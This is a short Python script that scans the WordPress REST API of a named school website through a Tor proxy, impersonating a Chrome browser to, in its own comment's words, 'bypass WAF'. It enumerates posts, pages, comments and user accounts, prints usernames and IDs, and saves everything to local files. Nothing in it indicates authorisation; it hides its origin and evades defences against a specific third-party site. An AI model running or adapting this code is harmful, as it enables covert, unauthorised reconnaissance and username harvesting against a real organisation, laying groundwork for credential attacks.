import requests
from curl_cffi import requests as curl_requests
import json

# Gatekeeper: Tor Proxy
TOR_PROXY = "socks5h://127.0.0.1:9150"
session = curl_requests.Session()
session.proxies = {'http': TOR_PROXY, 'https': TOR_PROXY}

# Target REST API Endpoints
base_url = "https://gn.cambridgeschool.edu.in/wp-json/wp/v2"
endpoints = ["posts", "pages", "users", "comments", "categories"]

def deep_scan_rest_api():
    print(f"[!] Starting Deep REST API Scan via Tor...")
    
    for endpoint in endpoints:
        url = f"{base_url}/{endpoint}"
        print(f"[*] Scanning: {url}")
        
        try:
            # Using impersonate to mimic browser and bypass WAF
            response = session.get(url, impersonate="chrome124", timeout=20)
            
            if response.status_code == 200:
                data = response.json()
                print(f"[+] Found {len(data)} items in {endpoint}")
                
                # Save findings to a file for analysis
                with open(f"D:/Hekki-Assistant/api_{endpoint}.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=4)
                
                # Check for sensitive fields
                if endpoint == "users":
                    for user in data:
                        print(f"    - User: {user.get('slug')} (ID: {user.get('id')})")
            else:
                print(f"[-] {endpoint} returned status: {response.status_code}")
                
        except Exception as e:
            print(f"[-] Error scanning {endpoint}: {e}")

if __name__ == "__main__":
    deep_scan_rest_api()
